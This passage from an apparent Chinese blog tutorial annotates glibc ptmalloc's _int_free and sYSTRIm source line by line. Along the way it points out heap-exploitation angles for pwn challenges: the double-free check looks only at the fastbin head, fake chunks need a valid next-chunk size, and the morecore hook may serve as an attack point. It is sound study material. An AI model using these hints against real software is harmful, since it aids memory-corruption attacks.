<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> ATOMIC_FASTBINS</span></span><br><span class="line">_int_free(mstate av, mchunkptr p, <span class="type">int</span> have_lock)</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">_int_free(mstate av, mchunkptr p)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T size;        <span class="comment">/* its size */</span></span><br><span class="line">  mfastbinptr*    fb;          <span class="comment">/* associated fastbin */</span></span><br><span class="line">  mchunkptr       nextchunk;   <span class="comment">/* next contiguous chunk */</span></span><br><span class="line">  INTERNAL_SIZE_T nextsize;    <span class="comment">/* its size */</span></span><br><span class="line">  <span class="type">int</span>             nextinuse;   <span class="comment">/* true if nextchunk is used */</span></span><br><span class="line">  INTERNAL_SIZE_T prevsize;    <span class="comment">/* size of previous contiguous chunk */</span></span><br><span class="line">  mchunkptr       bck;         <span class="comment">/* misc temp for linking */</span></span><br><span class="line">  mchunkptr       fwd;         <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *errstr = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> ATOMIC_FASTBINS</span></span><br><span class="line">  <span class="type">int</span> locked = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    </span><br><span class="line">  size = chunksize(p);</span><br></pre></td></tr></table></figure></div>

<p>依旧是那些很常用的变量，这里就不详细介绍了。</p>
<p>__int_free 函数主要有两个参数，一是指向 arena 的指针 av，二是传入的 chunk 指针，代码首先使用 chunksize 计算出当前 chunk 的大小，然后是一些安全检查</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Little security check which won&#x27;t hurt performance: the</span></span><br><span class="line"><span class="comment">     allocator never wrapps around at the end of the address space.</span></span><br><span class="line"><span class="comment">     Therefore we can exclude some size values which might appear</span></span><br><span class="line"><span class="comment">     here by accident or by &quot;design&quot; from some intruder.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect ((<span class="type">uintptr_t</span>) p &gt; (<span class="type">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">      || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">&quot;free(): invalid pointer&quot;</span>;</span><br><span class="line">    errout:</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> ATOMIC_FASTBINS</span></span><br><span class="line">      <span class="keyword">if</span> (! have_lock &amp;&amp; locked)</span><br><span class="line">	(<span class="type">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      malloc_printerr (check_action, errstr, chunk2mem(p));</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* We know that each chunk is at least MINSIZE bytes in size.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (size &lt; MINSIZE, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">&quot;free(): invalid size&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">  check_inuse_chunk(av, p);</span><br></pre></td></tr></table></figure></div>

<p>这段代码检查了 chunk 的 size 是否发生了溢出，堆块的地址要对齐，并且堆块的 size 不能小于最小值。</p>
<p>接下来会首先判断当前 chunk 是否属于 fastbin，因为 fastbin 是分配速度最快的缓冲区</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    If eligible, place chunk on a fastbin so it can be found</span></span><br><span class="line"><span class="comment">    and used quickly in malloc.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>)(get_max_fast ())  <span class="comment">// 判断 chunk 的 size 是否属于 fastbin 范围内</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> TRIM_FASTBINS</span></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">	If TRIM_FASTBINS set, don&#x27;t place chunks</span></span><br><span class="line"><span class="comment">	bordering top into fastbins</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">	|| __builtin_expect (chunksize (chunk_at_offset (p, size))</span><br><span class="line">			     &gt;= av-&gt;system_mem, <span class="number">0</span>)) <span class="comment">// 安全检查，当前 chunk 的 next chunk size 不能小于 2 * SIZE_SZ，并且不能大于此时的内存分配总量。</span></span><br><span class="line">      &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> ATOMIC_FASTBINS</span></span><br><span class="line">	<span class="comment">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class="line"><span class="comment">	   of system_mem might have let to a false positive.  Redo the test</span></span><br><span class="line"><span class="comment">	   after getting the lock.  */</span></span><br><span class="line">	<span class="keyword">if</span> (have_lock</span><br><span class="line">	    || (&#123; assert (locked == <span class="number">0</span>);</span><br><span class="line">		  mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">		  locked = <span class="number">1</span>;</span><br><span class="line">		  chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ</span><br><span class="line">		    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;</span><br><span class="line">	      &#125;))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	  &#123;</span><br><span class="line">	    errstr = <span class="string">&quot;free(): invalid next size (fast)&quot;</span>;</span><br><span class="line">	    <span class="keyword">goto</span> errout;</span><br><span class="line">	  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> ATOMIC_FASTBINS</span></span><br><span class="line">	<span class="keyword">if</span> (! have_lock)</span><br><span class="line">	  &#123;</span><br><span class="line">	    (<span class="type">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">	    locked = <span class="number">0</span>;</span><br><span class="line">	  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (perturb_byte, <span class="number">0</span>))</span><br><span class="line">      free_perturb (chunk2mem(p), size - SIZE_SZ);</span><br><span class="line"></span><br><span class="line">    set_fastchunks(av);    <span class="comment">// 将 chunk 的标志位置位</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> idx = fastbin_index(size);    <span class="comment">// 计算当前 chunk 在链表中的 index</span></span><br><span class="line">    fb = &amp;fastbin (av, idx);   <span class="comment">// 根据 index 获取链表头结点指针</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> ATOMIC_FASTBINS</span></span><br><span class="line">    mchunkptr fd;</span><br><span class="line">    mchunkptr old = *fb;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> old_idx = ~<span class="number">0u</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">	<span class="comment">/* Another simple check: make sure the top of the bin is not the</span></span><br><span class="line"><span class="comment">	   record we are going to add (i.e., double free).  */</span></span><br><span class="line">	<span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">	  &#123;</span><br><span class="line">	    errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">	    <span class="keyword">goto</span> errout;</span><br><span class="line">	  &#125;</span><br><span class="line">	<span class="keyword">if</span> (old != <span class="literal">NULL</span>)</span><br><span class="line">	  old_idx = fastbin_index(chunksize(old));</span><br><span class="line">	p-&gt;fd = fd = old;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, fd)) != fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fd != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (old_idx != idx, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">	errstr = <span class="string">&quot;invalid fastbin entry (free)&quot;</span>;</span><br><span class="line">	<span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="comment">/* Another simple check: make sure the top of the bin is not the</span></span><br><span class="line"><span class="comment">       record we are going to add (i.e., double free).  */</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (*fb == p, <span class="number">0</span>))    <span class="comment">// 当前链表的第一个堆块不能是正要插入的堆块，防止 double free 的发生</span></span><br><span class="line">      &#123;</span><br><span class="line">	errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">	<span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">if</span> (*fb != <span class="literal">NULL</span></span><br><span class="line">	&amp;&amp; __builtin_expect (fastbin_index(chunksize(*fb)) != idx, <span class="number">0</span>)) <span class="comment">// 如果当前链表不为空，但是第一个堆块的 size 不符合此链表的大小，说明某处发生了错误</span></span><br><span class="line">      &#123;</span><br><span class="line">	errstr = <span class="string">&quot;invalid fastbin entry (free)&quot;</span>;</span><br><span class="line">	<span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    p-&gt;fd = *fb;  <span class="comment">// 如果以上检查都正常，就将当前 chunk 插入到 fastbin 中</span></span><br><span class="line">    *fb = p;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<p>这部分代码比较简单，实现的功能是将属于 fastbin 的 chunk 插入到 fastbin 对应的链表中去，当 free 一个属于 fastbin 的 chunk 时，会首先检查这个 chunk 的下一个 chunk 的 size 是否正确，这也就是为什么在一些 pwn 题中伪造 fastbin chunk 的时候要一并伪造好下一个 chunk 的结构。</p>
<p>接着会获取 chunk 在 fastbin 中的 index，并且检查这条链表是否合法，如果链表不为空会判断第一个堆块是否属于当前链表，如果不是，说明发生了异常。另外还会判断正要插入的 chunk 是不是已经是当前链表的第一个堆块，如果是的话，说明发生了 double free(<strong>注意：这里仅仅检查了链表的第一个堆块，而没有遍历所有堆块，这就是 fastbin double free 能够成功的关键原因！</strong>)。</p>
<p>如果上面这些检查都没有问题，就会把 chunk 插入到对应的 fastbin 链表中，注意 fastbin 是从头部插入，而 malloc 也是从头部取出。另外，代码中涉及到了 ATOMIC_FASTBIN 优化的问题，它的机制之前已经简要介绍过，利用 lock-free 基础实现对 fastbin 链表的操作，我们这里就不去深究了。</p>
<p>上面的流程可以用这张图片表示<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/malloc_free_13.png"
                      alt="malloc_free_13.png"
                ></p>
<p>如果待 free 的堆块不属于 fastbin ，那么就会进入到下一段逻辑，代码如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    Consolidate other non-mmapped chunks as they arrive.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p)) &#123;   <span class="comment">// 如果 chunk 不是通过 mmap 分配的</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> ATOMIC_FASTBINS</span></span><br><span class="line">    <span class="keyword">if</span> (! have_lock) &#123;</span><br><span class="line"><span class="meta"># <span class="keyword">if</span> THREAD_STATS</span></span><br><span class="line">      <span class="keyword">if</span>(!mutex_trylock(&amp;av-&gt;mutex))</span><br><span class="line">	++(av-&gt;stat_lock_direct);</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">	(<span class="type">void</span>)mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">	++(av-&gt;stat_lock_wait);</span><br><span class="line">      &#125;</span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line">      (<span class="type">void</span>)mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">      locked = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    nextchunk = chunk_at_offset(p, size);    <span class="comment">// 找到当前 chunk 的下一个 chunk</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Lightweight tests: check whether the block is already the</span></span><br><span class="line"><span class="comment">       top block.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (p == av-&gt;top, <span class="number">0</span>))  <span class="comment">// 如果传入 free 函数的 chunk 指针指向 top，表示发生了错误</span></span><br><span class="line">      &#123;</span><br><span class="line">	errstr = <span class="string">&quot;double free or corruption (top)&quot;</span>;</span><br><span class="line">	<span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (contiguous (av)</span><br><span class="line">			  &amp;&amp; (<span class="type">char</span> *) nextchunk</span><br><span class="line">			  &gt;= ((<span class="type">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))  <span class="comment">// 判断 next chunk 是否超出 arena 的边界</span></span><br><span class="line">      &#123;</span><br><span class="line">	errstr = <span class="string">&quot;double free or corruption (out)&quot;</span>;</span><br><span class="line">	<span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="comment">/* Or whether the block is actually not marked used.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (!prev_inuse(nextchunk), <span class="number">0</span>))  <span class="comment">// 判断 next chunk 的 p_inuse 位是否已经被标记(正常情况下一定被标记)</span></span><br><span class="line">      &#123;</span><br><span class="line">	errstr = <span class="string">&quot;double free or corruption (!prev)&quot;</span>;</span><br><span class="line">	<span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    nextsize = chunksize(nextchunk);  <span class="comment">// 取出 next chunk 的 size</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (nextchunk-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">	|| __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))  <span class="comment">// size 必须满足要求</span></span><br><span class="line">      &#123;</span><br><span class="line">	errstr = <span class="string">&quot;free(): invalid next size (normal)&quot;</span>;</span><br><span class="line">	<span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (perturb_byte, <span class="number">0</span>))  </span><br><span class="line">      free_perturb (chunk2mem(p), size - SIZE_SZ);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;    <span class="comment">// 判断前一个堆块是否为空闲，如果是，则尝试进行合并</span></span><br><span class="line">      prevsize = p-&gt;prev_size;</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">      unlink(p, bck, fwd);   <span class="comment">// 注意这里使用了 unlink 操作</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;  <span class="comment">// 如果后一个堆块不是 top</span></span><br><span class="line">      <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* consolidate forward */</span></span><br><span class="line">      <span class="keyword">if</span> (!nextinuse) &#123;    <span class="comment">// 判断后一个堆块是否处于空闲状态</span></span><br><span class="line">	unlink(nextchunk, bck, fwd);  <span class="comment">// 依旧是 unlink 操作，和后一个 chunk 进行合并</span></span><br><span class="line">	size += nextsize;</span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">	clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">	Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">	not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">	been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line"></span><br><span class="line">      bck = unsorted_chunks(av);</span><br><span class="line">      fwd = bck-&gt;fd;</span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (fwd-&gt;bk != bck, <span class="number">0</span>))</span><br><span class="line">	&#123;</span><br><span class="line">	  errstr = <span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">	  <span class="keyword">goto</span> errout;</span><br><span class="line">	&#125;</span><br><span class="line">      p-&gt;fd = fwd;</span><br><span class="line">      p-&gt;bk = bck;</span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">	&#123;</span><br><span class="line">	  p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">	  p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">      bck-&gt;fd = p;</span><br><span class="line">      fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      set_foot(p, size);</span><br><span class="line"></span><br><span class="line">      check_free_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="comment">// 以上代码将合并后的(或者没有合并) chunk 插入到 unsorted bin 中，如果合并后的 chunk 属于 large chunk，会将 fd_nextsize 和 bk_nextsize 进行清空，因为这两个字段在 unsorted bin 中无用</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If the chunk borders the current high end of memory,</span></span><br><span class="line"><span class="comment">      consolidate into top</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> &#123;   <span class="comment">// 如果 free 的 chunk 正好位于 top chunk 上方，就直接和 top 合并，这一点在 pwn 题中比较重要</span></span><br><span class="line">      size += nextsize;</span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      av-&gt;top = p;</span><br><span class="line">      check_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If freeing a large space, consolidate possibly-surrounding</span></span><br><span class="line"><span class="comment">      chunks. Then, if the total unused topmost memory exceeds trim</span></span><br><span class="line"><span class="comment">      threshold, ask malloc_trim to reduce top.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Unless max_fast is 0, we don&#x27;t know if there are fastbins</span></span><br><span class="line"><span class="comment">      bordering top, so we cannot tell for sure whether threshold</span></span><br><span class="line"><span class="comment">      has been reached unless fastbins are consolidated.  But we</span></span><br><span class="line"><span class="comment">      don&#x27;t want to consolidate on each free.  As a compromise,</span></span><br><span class="line"><span class="comment">      consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD</span></span><br><span class="line"><span class="comment">      is reached.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;  <span class="comment">// 如果经过合并的堆块大小超过了 FASTBIN_CONSOLIDATION_THRESHOLD 阈值(64 KB)</span></span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks(av))    <span class="comment">// 如果此时 fastbin 链表不为空，就会调用 consolidate 合并 fastbin 中的 chunk</span></span><br><span class="line">	malloc_consolidate(av); <span class="comment">// 调用 consolidate，将 fastbin chunk 合并到 unsorted bin</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (av == &amp;main_arena) &#123;   <span class="comment">// 如果当前分配区是主分配区</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MORECORE_CANNOT_TRIM </span></span><br><span class="line">	<span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(chunksize(av-&gt;top)) &gt;= </span><br><span class="line">	    (<span class="type">unsigned</span> <span class="type">long</span>)(mp_.trim_threshold))   <span class="comment">// 如果当前 top chunk 大小大于 heap 的收缩阈值(可以结合上面的 brk 图示理解)，就会调用 sYSTRIm 收缩 heap</span></span><br><span class="line">	  sYSTRIm(mp_.top_pad, av);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="comment">/* Always try heap_trim(), even if the top chunk is not</span></span><br><span class="line"><span class="comment">	   large, because the corresponding heap might go away.  */</span></span><br><span class="line">	heap_info *heap = heap_for_ptr(top(av));    <span class="comment">// 如果当前分配区不是主分配区，就调用 heap_trim 收缩 sub_heap</span></span><br><span class="line"></span><br><span class="line">	assert(heap-&gt;ar_ptr == av);</span><br><span class="line">	heap_trim(heap, mp_.top_pad);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> ATOMIC_FASTBINS</span></span><br><span class="line">    <span class="keyword">if</span> (! have_lock) &#123;</span><br><span class="line">      assert (locked);</span><br><span class="line">      (<span class="type">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<p>上面一段代码比较长，但是实现的功能很简单，如果代码能够执行到这里，说明用户想要 free 的 chunk 大小不属于 fastbin，此时 ptmalloc 会分别判断当前 chunk 物理相邻的堆块是否空闲，如果是，就会调用 unlink 将这些堆块从它们的链表中卸下，然后和当前 chunk 合并，如果和 top chunk 紧邻，就会和 top chunk 进行合并。</p>
<p>当 chunk 的合并完成之后，合并出来的 chunk 很有可能会很大(之前已经申请和释放了许多 chunk)，如果这个 chunk 大小超出了 FASTBIN_CONSOLIDATION_THRESHOLD 阈值，并且 fastbin 中还有堆块，那就会调用 consolidate 合并 fastbin 中的 chunk。</p>
<p>在合并操作完成之后，还会判断当前分配区是不是主分配区，如果是，并且 top chunk 的大小已经超过了 heap 的收缩阈值，就调用 sYSTRIm 收缩 heap，不是主分配区，也会使用 heap_trim 来收缩 sub_heap.</p>
<p>以上是待 free chunk 不是由 mmap 分配的情况，如果是由 mmap 分配的堆块，会调用函数 munmap_chunk</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> HAVE_MMAP</span></span><br><span class="line">    munmap_chunk (p);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<p>这个函数主要用来回收 mmap 分配的空间。</p>
<p>结合这张图片理解<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/malloc_free_14.png"
                      alt="malloc_free_14.png"
                ></p>
<h2 id="sYSTRIm"><a href="#sYSTRIm" class="headerlink" title="sYSTRIm"></a>sYSTRIm</h2><p>这个函数可以视为 sYSMALLOc 函数的逆过程，负责将内存返还给操作系统。</p>
<p>摘录 ptmalloc 的注释如下</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sYSTRIm is an inverse of sorts to sYSMALLOc.  It gives memory back</span><br><span class="line">  to the system (via negative arguments to sbrk) if there is unused</span><br><span class="line">  memory at the `high&#x27; end of the malloc pool. It is called</span><br><span class="line">  automatically by free() when top space exceeds the trim</span><br><span class="line">  threshold. It is also called by the public malloc_trim routine.  It</span><br><span class="line">  returns 1 if it actually released any memory, else 0.</span><br></pre></td></tr></table></figure></div>

<p>函数的代码如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> __STD_C</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">sYSTRIm</span><span class="params">(<span class="type">size_t</span> pad, mstate av)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">sYSTRIm</span><span class="params">(pad, av)</span> <span class="type">size_t</span> pad; mstate av;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">long</span>  top_size;        <span class="comment">/* Amount of top-most memory */</span></span><br><span class="line">  <span class="type">long</span>  extra;           <span class="comment">/* Amount to release */</span></span><br><span class="line">  <span class="type">long</span>  released;        <span class="comment">/* Amount actually released */</span></span><br><span class="line">  <span class="type">char</span>* current_brk;     <span class="comment">/* address returned by pre-check sbrk call */</span></span><br><span class="line">  <span class="type">char</span>* new_brk;         <span class="comment">/* address returned by post-check sbrk call */</span></span><br><span class="line">  <span class="type">size_t</span> pagesz;</span><br><span class="line"></span><br><span class="line">  pagesz = mp_.pagesize;  <span class="comment">//获取一内存页的大小</span></span><br><span class="line">  top_size = chunksize(av-&gt;top);  <span class="comment">// 获取 topchunk 的 size</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Release in pagesize units, keeping at least one page */</span></span><br><span class="line">  extra = ((top_size - pad - MINSIZE + (pagesz<span class="number">-1</span>)) / pagesz - <span class="number">1</span>) * pagesz; <span class="comment">// 计算 top chunk 中最大可释放的整数页的数量</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (extra &gt; <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Only proceed if end of memory is where we last set it.</span></span><br><span class="line"><span class="comment">      This avoids problems if there were foreign sbrk calls.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    current_brk = (<span class="type">char</span>*)(MORECORE(<span class="number">0</span>));  <span class="comment">// 获取 brk 的值</span></span><br><span class="line">    <span class="keyword">if</span> (current_brk == (<span class="type">char</span>*)(av-&gt;top) + top_size) &#123; <span class="comment">// 如果和此时 top chunk 的结束地址相同，说明可以执行 heap 收缩</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">	Attempt to release memory. We ignore MORECORE return value,</span></span><br><span class="line"><span class="comment">	and instead call again to find out where new end of memory is.</span></span><br><span class="line"><span class="comment">	This avoids problems if first call releases less than we asked,</span></span><br><span class="line"><span class="comment">	of if failure somehow altered brk value. (We could still</span></span><br><span class="line"><span class="comment">	encounter problems if it altered brk in some very bad way,</span></span><br><span class="line"><span class="comment">	but the only thing we can do is adjust anyway, which will cause</span></span><br><span class="line"><span class="comment">	some downstream failure.)</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line"></span><br><span class="line">      MORECORE(-extra);  <span class="comment">// 调用 sbrk 释放内存</span></span><br><span class="line">      <span class="comment">/* Call the `morecore&#x27; hook if necessary.  */</span></span><br><span class="line">      <span class="type">void</span> (*hook) (<span class="type">void</span>) = force_reg (__after_morecore_hook);</span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">	(*hook) ();   <span class="comment">// 执行 more_hook (能否成为新的攻击点呢？)</span></span><br><span class="line">      new_brk = (<span class="type">char</span>*)(MORECORE(<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (new_brk != (<span class="type">char</span>*)MORECORE_FAILURE) &#123;</span><br><span class="line">	released = (<span class="type">long</span>)(current_brk - new_brk);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (released != <span class="number">0</span>) &#123;</span><br><span class="line">	  <span class="comment">/* Success. Adjust top. */</span></span><br><span class="line">	  av-&gt;system_mem -= released;</span><br><span class="line">	  set_head(av-&gt;top, (top_size - released) | PREV_INUSE);</span><br><span class="line">	  check_malloc_state(av);</span><br><span class="line">	  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这个函数的流程也是比较简单的，就不再赘述了。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/malloc_free_15.png"
                      alt="malloc_free_15.png"
                ></p>
